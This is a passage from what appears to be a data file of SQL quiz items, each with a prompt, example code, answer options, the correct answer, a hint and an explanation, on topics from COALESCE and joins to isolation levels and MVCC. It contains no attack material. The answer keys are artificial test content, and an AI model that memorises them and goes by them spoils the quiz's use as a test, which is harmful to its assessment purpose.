    hint: "ANSI SQL supports multi-row inserts via `VALUES (row1), (row2), ...`.",
    explanation: "Standard SQL enables atomic multi-row insertions by providing comma-separated tuples within the `VALUES` clause: `INSERT INTO table (col) VALUES ('val1'), ('val2'), ('val3');`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "insert", "dml"]
  },
  {
    id: "sql-beg-016",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "functions",
    subtopic: "coalesce_basic",
    standardVersion: "ANSI SQL",
    prompt: "What is printed by `COALESCE(NULL, NULL, 'Fallback', 'Secondary')`?",
    code: "SELECT COALESCE(NULL, NULL, 'Fallback', 'Secondary');",
    options: ["Fallback", "Secondary", "NULL", "Fallback Secondary"],
    correctAnswer: "Fallback",
    acceptedAnswers: ["Fallback"],
    hint: "`COALESCE` scans arguments left-to-right and returns the first non-null value.",
    explanation: "The ANSI standard `COALESCE(arg1, arg2, ...)` function evaluates its arguments in order from left to right and returns the first argument that is not `NULL`. Since the first two are NULL, it returns `'Fallback'`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "coalesce", "functions"]
  },
  {
    id: "sql-beg-017",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "dml",
    subtopic: "update_where",
    standardVersion: "ANSI SQL",
    prompt: "What does this UPDATE statement modify?",
    code: "UPDATE employees \nSET salary = salary * 1.10 \nWHERE department = 'Engineering';",
    options: [
      "Increases the salary by 10% for all employees in Engineering",
      "Creates a new column named salary_10",
      "Sets the salary of all employees to 1.10",
      "Deletes all employees not in Engineering"
    ],
    correctAnswer: "Increases the salary by 10% for all employees in Engineering",
    acceptedAnswers: ["Increases the salary by 10% for all employees in Engineering"],
    hint: "`salary * 1.10` calculates a 10% increase applied only to rows matching the `WHERE` condition.",
    explanation: "`UPDATE ... SET salary = salary * 1.10 WHERE department = 'Engineering'` modifies existing rows in place where department equals 'Engineering', increasing their salary value by 10%.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "update", "dml"]
  },
  {
    id: "sql-beg-018",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "aliases",
    subtopic: "column_table_aliases",
    standardVersion: "ANSI SQL",
    prompt: "What is the keyword used to provide temporary aliases for columns or tables in SQL?",
    code: "SELECT u.first_name AS given_name FROM users AS u;",
    options: ["AS", "ALIAS", "NAME", "IS"],
    correctAnswer: "AS",
    acceptedAnswers: ["AS"],
    hint: "`SELECT col AS alias` renames the column in the output.",
    explanation: "The `AS` keyword introduces an alias for a table expression or projected column name, making output headers readable and qualifying disambiguated table references in joins.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "alias", "syntax"]
  },
  {
    id: "sql-beg-019",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "constraints",
    subtopic: "foreign_key_role",
    standardVersion: "ANSI SQL",
    prompt: "What fundamental database property is enforced by a `FOREIGN KEY` constraint?",
    code: "CREATE TABLE orders (\n    order_id INT PRIMARY KEY,\n    customer_id INT REFERENCES customers(id)\n);",
    options: [
      "Referential Integrity: Ensuring `customer_id` always corresponds to an existing row in `customers`",
      "Encrypts order_id in disk storage",
      "Forces customer_id to be unique across all orders",
      "Guarantees orders are executed concurrently"
    ],
    correctAnswer: "Referential Integrity: Ensuring `customer_id` always corresponds to an existing row in `customers`",
    acceptedAnswers: ["Referential Integrity: Ensuring `customer_id` always corresponds to an existing row in `customers`"],
    hint: "Foreign keys prevent orphaned records by ensuring child values exist in the referenced parent table.",
    explanation: "A Foreign Key establishes a relationship between two tables, enforcing Referential Integrity. The database prevents inserting order rows with invalid customer IDs or deleting customers who still have active child orders.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "foreign_key", "referential_integrity"]
  },
  {
    id: "sql-beg-020",
    language: "sql",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_types",
    subtopic: "char_vs_varchar",
    standardVersion: "ANSI SQL",
    prompt: "What is the difference between `CHAR(10)` and `VARCHAR(10)` when storing the string `'abc'`?",
    code: "CREATE TABLE data (\n    fixed_str CHAR(10),\n    var_str VARCHAR(10)\n);",
    options: [
      "`CHAR(10)` right-pads the value with spaces to exactly 10 characters; `VARCHAR(10)` stores only 3 characters",
      "`CHAR(10)` can only store numbers; `VARCHAR(10)` stores text",
      "`VARCHAR(10)` is fixed length; `CHAR(10)` is variable length",
      "`CHAR(10)` uses 10 bits; `VARCHAR(10)` uses 10 bytes"
    ],
    correctAnswer: "`CHAR(10)` right-pads the value with spaces to exactly 10 characters; `VARCHAR(10)` stores only 3 characters",
    acceptedAnswers: ["`CHAR(10)` right-pads the value with spaces to exactly 10 characters; `VARCHAR(10)` stores only 3 characters"],
    hint: "CHAR is fixed-length (space padded). VARCHAR is variable-length (stores actual string length).",
    explanation: "`CHAR(N)` is fixed-length: strings shorter than N are right-padded with whitespace up to N characters. `VARCHAR(N)` is variable-length: it stores only the actual characters provided plus a small prefix length byte.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sql", "char", "varchar", "data_types"]
  },

  // =========================================================================
  // SQL INTERMEDIATE (20 QUESTIONS: sql-int-001 to sql-int-020)
  // =========================================================================
  {
    id: "sql-int-001",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "set_operations",
    subtopic: "union_vs_union_all",
    standardVersion: "ANSI SQL",
    prompt: "What is the difference in performance and output between `UNION` and `UNION ALL`?",
    code: "SELECT 1 UNION ALL SELECT 1;\nSELECT 1 UNION SELECT 1;",
    options: [
      "`UNION ALL` preserves duplicates (faster); `UNION` performs a distinct sort/hash to eliminate duplicate rows",
      "`UNION` preserves duplicates; `UNION ALL` removes duplicates",
      "`UNION ALL` only works on numbers; `UNION` works on all data types",
      "Both are identical in performance and output"
    ],
    correctAnswer: "`UNION ALL` preserves duplicates (faster); `UNION` performs a distinct sort/hash to eliminate duplicate rows",
    acceptedAnswers: ["`UNION ALL` preserves duplicates (faster); `UNION` performs a distinct sort/hash to eliminate duplicate rows"],
    hint: "`UNION` includes an implicit DISTINCT operation, incurring sorting or hashing overhead.",
    explanation: "`UNION ALL` simply concatenates result sets without deduplication, outputting `1` and `1` (2 rows) with minimal CPU cost. `UNION` removes duplicates, outputting only `1` (1 row) at the cost of sorting or hashing the combined dataset.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["sql", "union", "union_all", "performance"]
  },
  {
    id: "sql-int-002",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "window_functions",
    subtopic: "row_number_rank_dense_rank",
    standardVersion: "ANSI SQL:2003",
    prompt: "Given values `[100, 100, 80]`, what ranks are generated by `RANK()` vs `DENSE_RANK()`?",
    code: "SELECT score,\n  RANK() OVER (ORDER BY score DESC) as r,\n  DENSE_RANK() OVER (ORDER BY score DESC) as dr\nFROM scores;",
    options: [
      "RANK: 1, 1, 3; DENSE_RANK: 1, 1, 2",
      "RANK: 1, 2, 3; DENSE_RANK: 1, 1, 2",
      "RANK: 1, 1, 2; DENSE_RANK: 1, 1, 3",
      "RANK: 1, 2, 3; DENSE_RANK: 1, 2, 3"
    ],
    correctAnswer: "RANK: 1, 1, 3; DENSE_RANK: 1, 1, 2",
    acceptedAnswers: ["RANK: 1, 1, 3; DENSE_RANK: 1, 1, 2"],
    hint: "`RANK()` skips ranks after ties (1, 1, 3). `DENSE_RANK()` never leaves gaps after ties (1, 1, 2).",
    explanation: "When tied values occur, both assign rank 1 to both 100s. `RANK()` skips ranks according to tied count, assigning 3 to the next item (1, 1, 3). `DENSE_RANK()` leaves no gaps, assigning 2 to the next item (1, 1, 2).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["window_functions", "rank", "dense_rank"]
  },
  {
    id: "sql-int-003",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "window_functions",
    subtopic: "lead_lag",
    standardVersion: "ANSI SQL:2003",
    prompt: "What does the `LAG(val, 1)` window function return for the very first row in an ordered partition?",
    code: "SELECT day, temp,\n  LAG(temp, 1) OVER (ORDER BY day) as prev_temp\nFROM weather;",
    options: ["NULL", "0", "The current row temp", "Throws runtime error"],
    correctAnswer: "NULL",
    acceptedAnswers: ["NULL"],
    hint: "`LAG(col, N)` accesses data from N rows prior. For the first row, there is no prior row.",
    explanation: "`LAG(val, 1)` returns the value of `val` from 1 row prior in the partition. Because row 1 has no preceding row, `LAG` defaults to `NULL` (unless an optional default value argument is provided).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["window_functions", "lag", "lead"]
  },
  {
    id: "sql-int-004",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "cte",
    subtopic: "common_table_expressions",
    standardVersion: "ANSI SQL:1999",
    prompt: "What is the primary benefit of Common Table Expressions (CTE) declared with `WITH`?",
    code: "WITH RankedSales AS (\n    SELECT rep_id, amount, RANK() OVER (ORDER BY amount DESC) as rnk\n    FROM sales\n)\nSELECT rep_id FROM RankedSales WHERE rnk = 1;",
    options: [
      "Improves query modularity, readability, and allows self-referencing recursive queries",
      "Creates a permanent table in the database catalog",
      "Automatically indexes all columns in the CTE",
      "Forces the query to run in parallel threads"
    ],
    correctAnswer: "Improves query modularity, readability, and allows self-referencing recursive queries",
    acceptedAnswers: ["Improves query modularity, readability, and allows self-referencing recursive queries"],
    hint: "CTEs define named temporary result sets for the duration of a single SELECT, INSERT, UPDATE, or DELETE.",
    explanation: "A Common Table Expression (CTE) defines a named temporary result set within a single statement execution, replacing convoluted nested subqueries with readable, maintainable logical steps and enabling recursive queries.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["cte", "with", "subqueries"]
  },
  {
    id: "sql-int-005",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "expressions",
    subtopic: "case_when",
    standardVersion: "ANSI SQL",
    prompt: "What is printed by this `CASE` conditional statement when score is 85?",
    code: "SELECT \n  CASE \n    WHEN score >= 90 THEN 'A'\n    WHEN score >= 80 THEN 'B'\n    ELSE 'C'\n  END AS grade\nFROM (SELECT 85 as score) t;",
    options: ["B", "A", "C", "NULL"],
    correctAnswer: "B",
    acceptedAnswers: ["B"],
    hint: "`CASE` evaluates conditions sequentially from top to bottom and short-circuits on the first match.",
    explanation: "SQL evaluates `CASE` branches in order. 85 is not >= 90. Next branch `85 >= 80` evaluates to true, so it immediately returns `'B'` without evaluating the remaining clauses.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["sql", "case", "conditionals"]
  },
  {
    id: "sql-int-006",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "subqueries",
    subtopic: "exists_vs_in",
    standardVersion: "ANSI SQL",
    prompt: "Why can `WHERE EXISTS (...)` perform significantly faster than `WHERE val IN (...)` on large subqueries?",
    code: "SELECT c.id FROM customers c \nWHERE EXISTS (\n    SELECT 1 FROM orders o WHERE o.customer_id = c.id\n);",
    options: [
      "`EXISTS` terminates evaluation immediately upon finding the first matching row, while `IN` may materialize the entire subquery list",
      "`EXISTS` bypasses disk storage and queries RAM directly",
      "`IN` cannot be used with foreign keys",
      "`EXISTS` disables transaction logging"
    ],
    correctAnswer: "`EXISTS` terminates evaluation immediately upon finding the first matching row, while `IN` may materialize the entire subquery list",
    acceptedAnswers: ["`EXISTS` terminates evaluation immediately upon finding the first matching row, while `IN` may materialize the entire subquery list"],
    hint: "`EXISTS` only checks for boolean presence of at least one row, enabling early short-circuit optimization.",
    explanation: "`EXISTS` performs a boolean existence check: as soon as the query planner matches a single row in the correlated subquery, scanning stops immediately (short-circuit). `IN` can require materializing or sorting the full set of subquery results.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["exists", "in", "subqueries", "optimization"]
  },
  {
    id: "sql-int-007",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "functions",
    subtopic: "nullif_division_by_zero",
    standardVersion: "ANSI SQL",
    prompt: "How does `NULLIF(b, 0)` prevent division by zero errors in SQL calculations?",
    code: "SELECT a / NULLIF(b, 0) AS ratio FROM metrics;",
    options: [
      "If b is 0, NULLIF returns NULL; dividing by NULL yields NULL instead of throwing a division-by-zero error",
      "NULLIF converts 0 to 1 automatically",
      "NULLIF rounds 0 to 0.0001",
      "NULLIF skips the row from being returned"
    ],
    correctAnswer: "If b is 0, NULLIF returns NULL; dividing by NULL yields NULL instead of throwing a division-by-zero error",
    acceptedAnswers: ["If b is 0, NULLIF returns NULL; dividing by NULL yields NULL instead of throwing a division-by-zero error"],
    hint: "`NULLIF(x, y)` returns NULL if `x == y`. Any arithmetic with NULL results in NULL.",
    explanation: "`NULLIF(val1, val2)` returns `NULL` if `val1 == val2`; otherwise it returns `val1`. If `b == 0`, `NULLIF(b, 0)` returns `NULL`. Since `a / NULL` safely evaluates to `NULL`, division-by-zero runtime exceptions are cleanly avoided.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["sql", "nullif", "division_by_zero"]
  },
  {
    id: "sql-int-008",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "indexing",
    subtopic: "composite_index_leftmost",
    standardVersion: "Relational Indexing",
    prompt: "Given a composite B-Tree index on `(last_name, first_name)`, which query CANNOT take advantage of the index?",
    code: "-- Index: idx_name ON users(last_name, first_name)",
    options: [
      "`WHERE first_name = 'Alice'` (violates the leftmost prefix rule)",
      "`WHERE last_name = 'Smith'`",
      "`WHERE last_name = 'Smith' AND first_name = 'Alice'`",
      "`WHERE last_name LIKE 'Smi%'`"
    ],
    correctAnswer: "`WHERE first_name = 'Alice'` (violates the leftmost prefix rule)",
    acceptedAnswers: ["`WHERE first_name = 'Alice'` (violates the leftmost prefix rule)"],
    hint: "B-Tree composite indexes are sorted starting from the leftmost column. Skipping the first column renders the index unusable for range/equality search.",
    explanation: "Composite B-Tree indexes follow the Leftmost Prefix Rule. Because the index is ordered first by `last_name`, searching for `first_name` alone without specifying `last_name` cannot navigate the B-Tree and requires a full table scan.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["indexing", "b_tree", "composite_index"]
  },
  {
    id: "sql-int-009",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "ddl",
    subtopic: "truncate_vs_delete",
    standardVersion: "ANSI / Database Engines",
    prompt: "Why is `TRUNCATE TABLE` dramatically faster than `DELETE FROM table;` on tables with millions of rows?",
    code: "TRUNCATE TABLE audit_logs;",
    options: [
      "`TRUNCATE` is a DDL operation that deallocates entire data storage pages directly without logging individual row-by-row deletions",
      "`TRUNCATE` runs asynchronously in the background",
      "`TRUNCATE` compresses the rows into a zip file",
      "`TRUNCATE` only removes rows that have no indexes"
    ],
    correctAnswer: "`TRUNCATE` is a DDL operation that deallocates entire data storage pages directly without logging individual row-by-row deletions",
    acceptedAnswers: ["`TRUNCATE` is a DDL operation that deallocates entire data storage pages directly without logging individual row-by-row deletions"],
    hint: "`DELETE` writes an undo/redo log entry for every single row. `TRUNCATE` simply resets the table allocation extents.",
    explanation: "`DELETE` scans every row, logs each deletion in transaction rollback logs, and triggers row-level triggers. `TRUNCATE` is a DDL command that deallocates underlying storage pages at the disk extent level with minimal logging, executing almost instantaneously.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["truncate", "delete", "ddl", "performance"]
  },
  {
    id: "sql-int-010",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "transactions",
    subtopic: "rollback_behavior",
    standardVersion: "ANSI SQL",
    prompt: "What is the state of the database after executing this transaction sequence?",
    code: "BEGIN TRANSACTION;\nINSERT INTO balances VALUES (1, 500);\nUPDATE balances SET amount = 600 WHERE id = 1;\nROLLBACK;\nSELECT COUNT(*) FROM balances WHERE id = 1;",
    options: ["0", "1 (with amount 500)", "1 (with amount 600)", "TransactionError"],
    correctAnswer: "0",
    acceptedAnswers: ["0"],
    hint: "`ROLLBACK` completely undoes all changes made since the `BEGIN TRANSACTION` statement.",
    explanation: "A transaction represents an atomic unit of work. Executing `ROLLBACK` undoes all modifications performed within the transaction, reverting the database to its exact pre-transaction state. The inserted row is discarded, yielding 0 rows.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["transactions", "rollback", "acid"]
  },
  {
    id: "sql-int-011",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "joins",
    subtopic: "full_outer_join",
    standardVersion: "ANSI SQL:1992",
    prompt: "What records does a `FULL OUTER JOIN` return?",
    code: "SELECT a.id, b.id \nFROM table_a a \nFULL OUTER JOIN table_b b ON a.id = b.id;",
    options: [
      "All matching rows, plus all unmatched rows from Table A and all unmatched rows from Table B (with NULLs for missing sides)",
      "Only rows that exist in both tables",
      "Only rows that do not match in either table",
      "Cartesian product of both tables"
    ],
    correctAnswer: "All matching rows, plus all unmatched rows from Table A and all unmatched rows from Table B (with NULLs for missing sides)",
    acceptedAnswers: ["All matching rows, plus all unmatched rows from Table A and all unmatched rows from Table B (with NULLs for missing sides)"],
    hint: "A FULL OUTER JOIN combines the results of both LEFT JOIN and RIGHT JOIN.",
    explanation: "`FULL OUTER JOIN` produces the complete union of matched and unmatched rows: matching pairs appear together; unmatched rows from Table A appear with NULLs for B; unmatched rows from Table B appear with NULLs for A.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["joins", "full_outer_join"]
  },
  {
    id: "sql-int-012",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "views",
    subtopic: "view_mechanics",
    standardVersion: "ANSI SQL",
    prompt: "What is stored in database disk storage when creating a standard (non-materialized) SQL `VIEW`?",
    code: "CREATE VIEW active_users AS \nSELECT id, email FROM users WHERE is_active = true;",
    options: [
      "Only the query definition text (the underlying data is dynamically retrieved every time the view is queried)",
      "A static copy of the data at the moment the view was created",
      "A B-Tree index on is_active",
      "A temporary table in tempdb"
    ],
    correctAnswer: "Only the query definition text (the underlying data is dynamically retrieved every time the view is queried)",
    acceptedAnswers: ["Only the query definition text (the underlying data is dynamically retrieved every time the view is queried)"],
    hint: "A standard view is a virtual table. It holds no data of its own.",
    explanation: "Standard views are virtual tables. The database stores only the SQL query text in the system catalog. Whenever a query selects from `active_users`, the database query planner rewrites the query to incorporate the view's underlying SELECT statement.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["views", "virtual_tables", "ddl"]
  },
  {
    id: "sql-int-013",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "window_functions",
    subtopic: "partition_by",
    standardVersion: "ANSI SQL:2003",
    prompt: "What does `PARTITION BY department` do inside an `OVER (...)` window clause?",
    code: "SELECT employee, department, salary,\n  AVG(salary) OVER (PARTITION BY department) as dept_avg\nFROM employees;",
    options: [
      "Calculates the average salary independently for each department without collapsing rows like GROUP BY does",
      "Physically splits the table into separate disk partitions",
      "Filters out departments with only one employee",
      "Orders the employees alphabetically by department"
    ],
    correctAnswer: "Calculates the average salary independently for each department without collapsing rows like GROUP BY does",
    acceptedAnswers: ["Calculates the average salary independently for each department without collapsing rows like GROUP BY does"],
    hint: "`GROUP BY` collapses multiple rows into a single summary row. `PARTITION BY` calculates aggregates while retaining every individual row.",
    explanation: "`PARTITION BY` divides the query result set into separate subgroups (partitions). The window function (`AVG(salary)`) is evaluated independently within each partition while retaining all individual employee rows in the final output.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["window_functions", "partition_by", "aggregates"]
  },
  {
    id: "sql-int-014",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "subqueries",
    subtopic: "correlated_subquery",
    standardVersion: "ANSI SQL",
    prompt: "What characterizes a Correlated Subquery?",
    code: "SELECT e1.name, e1.salary \nFROM employees e1 \nWHERE e1.salary > (\n    SELECT AVG(e2.salary) FROM employees e2 WHERE e2.dept = e1.dept\n);",
    options: [
      "The inner subquery references a column from the outer query table, executing once for every candidate row evaluated by the outer query",
      "The subquery is executed before the database server boots",
      "The subquery returns data to a separate database connection",
      "The inner query can only use the COUNT aggregate"
    ],
    correctAnswer: "The inner subquery references a column from the outer query table, executing once for every candidate row evaluated by the outer query",
    acceptedAnswers: ["The inner subquery references a column from the outer query table, executing once for every candidate row evaluated by the outer query"],
    hint: "Notice `e2.dept = e1.dept` binds the inner query to the current row of outer table `e1`.",
    explanation: "A correlated subquery depends on values from the current row of the outer query (`e1.dept`). It cannot be executed independently of the outer query and conceptually evaluates once for each candidate row processed by the outer query.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["correlated_subquery", "subqueries"]
  },
  {
    id: "sql-int-015",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "constraints",
    subtopic: "check_constraint",
    standardVersion: "ANSI SQL",
    prompt: "What happens when an `INSERT` statement violates a `CHECK (age >= 18)` constraint?",
    code: "INSERT INTO voters (name, age) VALUES ('Bobby', 15);",
    options: [
      "The database rejects the insert and raises a Check Constraint Violation error",
      "The database silently converts the age to 18",
      "The row is inserted into an error table in tempdb",
      "The database sets the age column to NULL"
    ],
    correctAnswer: "The database rejects the insert and raises a Check Constraint Violation error",
    acceptedAnswers: ["The database rejects the insert and raises a Check Constraint Violation error"],
    hint: "Check constraints enforce business rules on column values at the schema level.",
    explanation: "`CHECK` constraints validate boolean conditions for incoming data. If the condition evaluates to `FALSE` (15 is not >= 18), the database halts the statement and throws a constraint violation error, leaving the table unaltered.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["sql", "check_constraint", "constraints"]
  },
  {
    id: "sql-int-016",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "date_time",
    subtopic: "extract_date_part",
    standardVersion: "ANSI SQL",
    prompt: "What does the SQL standard function `EXTRACT(YEAR FROM timestamp_col)` return?",
    code: "SELECT EXTRACT(YEAR FROM TIMESTAMP '2026-10-22 14:30:00');",
    options: ["2026", "'2026'", "26", "Timestamp object"],
    correctAnswer: "2026",
    acceptedAnswers: ["2026"],
    hint: "`EXTRACT(field FROM source)` retrieves sub-fields such as year, month, day, or hour as numeric values.",
    explanation: "The ANSI `EXTRACT(field FROM source)` function extracts individual numeric components from date/time objects. Extracting `YEAR` from `'2026-10-22 ...'` returns the integer `2026`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["sql", "extract", "date_time"]
  },
  {
    id: "sql-int-017",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "strings",
    subtopic: "coalesce_concat",
    standardVersion: "ANSI SQL",
    prompt: "In standard SQL, what is the result of string concatenation using `||` when one operand is NULL?",
    code: "SELECT 'Hello ' || NULL || 'World';",
    options: ["NULL", "'Hello World'", "'Hello NULLWorld'", "'' (empty string)"],
    correctAnswer: "NULL",
    acceptedAnswers: ["NULL"],
    hint: "Under standard SQL rules, any scalar operation with NULL produces NULL.",
    explanation: "In ANSI SQL and PostgreSQL, standard string concatenation with `||` returns `NULL` if any operand is `NULL`. To prevent this, `CONCAT('Hello ', NULL, 'World')` or `COALESCE` is used to convert NULLs to empty strings.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["sql", "concat", "null"]
  },
  {
    id: "sql-int-018",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "set_operations",
    subtopic: "intersect_except",
    standardVersion: "ANSI SQL",
    prompt: "What do the `INTERSECT` and `EXCEPT` set operators compute?",
    code: "-- Set Operations\nSELECT id FROM set_a INTERSECT SELECT id FROM set_b;\nSELECT id FROM set_a EXCEPT SELECT id FROM set_b;",
    options: [
      "`INTERSECT` returns rows present in both queries; `EXCEPT` returns rows present in the first query but not in the second",
      "`INTERSECT` combines all rows; `EXCEPT` removes rows with NULLs",
      "`EXCEPT` returns rows present in both queries; `INTERSECT` returns unique rows",
      "Both operators perform cross joins"
    ],
    correctAnswer: "`INTERSECT` returns rows present in both queries; `EXCEPT` returns rows present in the first query but not in the second",
    acceptedAnswers: ["`INTERSECT` returns rows present in both queries; `EXCEPT` returns rows present in the first query but not in the second"],
    hint: "`INTERSECT` is set intersection ($A \cap B$). `EXCEPT` (or MINUS in Oracle) is set difference ($A \setminus B$).",
    explanation: "`INTERSECT` returns only distinct rows that exist in both result sets. `EXCEPT` (known as `MINUS` in some engines) returns rows from the first result set that do not exist in the second result set.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["set_operations", "intersect", "except"]
  },
  {
    id: "sql-int-019",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "cascading",
    subtopic: "on_delete_cascade",
    standardVersion: "ANSI SQL",
    prompt: "What occurs when deleting a row from `customers` if the orders table defines `FOREIGN KEY (customer_id) REFERENCES customers(id) ON DELETE CASCADE`?",
    code: "DELETE FROM customers WHERE id = 42;",
    options: [
      "All orders belonging to customer 42 are automatically deleted along with the customer",
      "The deletion is aborted because child orders exist",
      "Orders customer_id values are set to NULL",
      "Customer 42 is marked inactive but orders remain untouched"
    ],
    correctAnswer: "All orders belonging to customer 42 are automatically deleted along with the customer",
    acceptedAnswers: ["All orders belonging to customer 42 are automatically deleted along with the customer"],
    hint: "`ON DELETE CASCADE` automatically propagates deletion from parent records down to all related child records.",
    explanation: "When a foreign key specifies `ON DELETE CASCADE`, deleting a record from the parent table automatically triggers the database engine to delete all associated rows in the referencing child table, preventing orphaned rows.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["foreign_key", "on_delete_cascade", "referential_integrity"]
  },
  {
    id: "sql-int-020",
    language: "sql",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "data_types",
    subtopic: "boolean_comparisons",
    standardVersion: "ANSI SQL",
    prompt: "In SQL, what is the result of `NOT (TRUE AND UNKNOWN)`?",
    code: "SELECT (NOT (TRUE AND UNKNOWN)) IS UNKNOWN;",
    options: ["true", "false", "NULL", "SyntaxError"],
    correctAnswer: "true",
    acceptedAnswers: ["true"],
    hint: "In three-valued logic: `TRUE AND UNKNOWN` is `UNKNOWN`. `NOT UNKNOWN` is `UNKNOWN`. And `UNKNOWN IS UNKNOWN` is `TRUE`.",
    explanation: "Under SQL's 3VL truth tables: `TRUE AND UNKNOWN` evaluates to `UNKNOWN`. Applying `NOT` to `UNKNOWN` remains `UNKNOWN`. Finally, testing `UNKNOWN IS UNKNOWN` evaluates to boolean `true`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["sql", "three_valued_logic", "boolean"]
  },

  // =========================================================================
  // SQL EXPERT (20 QUESTIONS: sql-exp-001 to sql-exp-020)
  // =========================================================================
  {
    id: "sql-exp-001",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "acid_transactions",
    subtopic: "isolation_levels",
    standardVersion: "ANSI SQL / ACID",
    prompt: "Which transaction isolation anomaly is prevented by `REPEATABLE READ` that is permitted under `READ COMMITTED`?",
    code: "// Transaction Isolation Anomaly Analysis\nREAD UNCOMMITTED -> READ COMMITTED -> REPEATABLE READ -> SERIALIZABLE",
    options: [
      "Non-Repeatable Reads (Fuzzy Reads): Re-reading the same row within a transaction will never show modified data committed by concurrent transactions",
      "Dirty Reads: Reading uncommitted data from another transaction",
      "Deadlocks: Transactions will never block each other",
      "Network packet corruption"
    ],
    correctAnswer: "Non-Repeatable Reads (Fuzzy Reads): Re-reading the same row within a transaction will never show modified data committed by concurrent transactions",
    acceptedAnswers: ["Non-Repeatable Reads (Fuzzy Reads): Re-reading the same row within a transaction will never show modified data committed by concurrent transactions"],
    hint: "Under `READ COMMITTED`, if Transaction B commits an update to row X while Transaction A is running, A will see the new value when re-reading X.",
    explanation: "Under `READ COMMITTED`, querying the same row twice may return different values if another transaction committed updates in between (Non-Repeatable Read). `REPEATABLE READ` takes a snapshot at transaction start, guaranteeing identical row values on repeat reads.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["acid", "isolation_levels", "repeatable_read"]
  },
  {
    id: "sql-exp-002",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "acid_transactions",
    subtopic: "phantom_reads",
    standardVersion: "ANSI SQL:1992",
    prompt: "What defines a Phantom Read in SQL transaction concurrency?",
    code: "// Transaction 1:\nSELECT COUNT(*) FROM items WHERE price > 50; // returns 10\n// Transaction 2 commits: INSERT INTO items (price) VALUES (75);\n// Transaction 1:\nSELECT COUNT(*) FROM items WHERE price > 50; // returns 11!",
    options: [
      "A transaction re-executes a range query and finds new rows that were inserted and committed by another transaction",
      "A transaction reads data that was rolled back by another transaction",
      "A query fails because the index B-tree was deleted",
      "A transaction reads stale data from browser localStorage"
    ],
    correctAnswer: "A transaction re-executes a range query and finds new rows that were inserted and committed by another transaction",
    acceptedAnswers: ["A transaction re-executes a range query and finds new rows that were inserted and committed by another transaction"],
    hint: "Non-repeatable reads affect existing rows. Phantom reads affect range queries where new rows appear.",
    explanation: "A Phantom Read occurs when a transaction queries a range of rows matching a search condition, and a concurrent transaction inserts new matching rows and commits, causing the first transaction to see 'phantom' rows when re-running the range query. Preventing this requires `SERIALIZABLE` isolation.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["phantom_reads", "isolation_levels", "acid"]
  },
  {
    id: "sql-exp-003",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "database_internals",
    subtopic: "mvcc_mechanics",
    standardVersion: "PostgreSQL / MVCC",
    prompt: "How does Multi-Version Concurrency Control (MVCC) allow concurrent readers and writers without blocking each other?",
    code: "// MVCC in PostgreSQL / Oracle / InnoDB\n\"Readers never block writers, and writers never block readers.\"",
    options: [
      "Instead of mutating data in-place, updates create new row versions (xmin/xmax transaction snapshots); readers query consistent snapshots of past versions without locking",
      "By placing all tables in read-only memory",
      "By converting SQL queries into serialized single-threaded queues",
      "By duplicating the entire database schema per user connection"
    ],
    correctAnswer: "Instead of mutating data in-place, updates create new row versions (xmin/xmax transaction snapshots); readers query consistent snapshots of past versions without locking",
    acceptedAnswers: ["Instead of mutating data in-place, updates create new row versions (xmin/xmax transaction snapshots); readers query consistent snapshots of past versions without locking"],
